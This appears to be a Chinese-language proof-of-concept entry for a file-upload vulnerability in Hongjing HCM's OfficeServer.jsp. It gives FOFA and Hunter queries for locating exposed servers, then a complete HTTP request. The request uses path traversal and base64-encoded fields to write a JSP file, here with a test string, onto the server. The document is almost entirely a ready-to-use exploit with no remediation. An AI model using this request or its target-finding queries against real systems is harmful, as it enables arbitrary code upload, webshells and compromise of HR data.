# 宏景 HCM OfficeServer.jsp 文件上传漏洞

## 网络测绘

fofa: app="HJSOFT-HCM"

hunter: app.name="宏景 HCM"

## POC / EXP

```
POST /w_selfservice/oauthservlet/../../system/options/customreport/OfficeServer.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux i686; en-US; rv:116.0) Gecko/20000901 Firefox/116.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host:
Content-Length: 449

DBSTEP V3.0     351             0               666             DBSTEP=REJTVEVQ
OPTION=U0FWRUZJTEU=
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
FILETYPE=Li5cMW5kZXguanNw
RECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66

<%out.println("HelloWord");%>
```

```
FILETYPE=Li5cMW5kZXguanNw
..\1ndex.jsp
```